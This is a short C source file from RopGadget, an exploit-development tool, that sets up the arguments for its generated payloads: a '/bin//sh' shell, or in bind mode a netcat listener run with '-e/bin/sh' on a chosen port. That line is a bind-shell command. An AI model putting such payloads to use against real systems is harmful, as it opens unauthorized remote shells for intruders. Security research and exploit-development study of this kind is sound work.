/*
** RopGadget
** Allan Wirth - http://allanwirth.com/
** Jonathan Salwan - http://twitter.com/JonathanSalwan
**
** This program is free software; you can redistribute it and/or modify
** it under the terms of the GNU General Public License as published by
** the Free Software Foundation; either version 2 of the License, or
** (at your option) any later version.
**
** This program is distributed in the hope that it will be useful,
** but WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
** GNU General Public License for more details.
**
** You should have received a copy of the GNU General Public License
** along with this program; if not, write to the Free Software
** Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#include "ropgadget.h"

char **get_argv(void)
{
  char **argv;

  if (target_argv != NULL) {
    return target_argv;
  } else if (!bind_mode.flag) {
    argv = xmalloc(2 * sizeof(char *));
    argv[0] = "/bin//sh";
    argv[1] = NULL;
  } else {
    argv = xmalloc(4 * sizeof(char *));
    argv[0] = "/usr/bin/netcat";
    argv[1] = xmalloc(9 * sizeof(char));
    argv[2] = "-e/bin/sh";
    argv[3] = NULL;
    snprintf(argv[1], 9, "-ltp%d", (int)bind_mode.port);
  }
  return argv;
}

void free_argv(char **argv)
{
  if (target_argv == NULL) {
    if (bind_mode.flag) {
      free(argv[1]);
    }
    free(argv);
  }
}
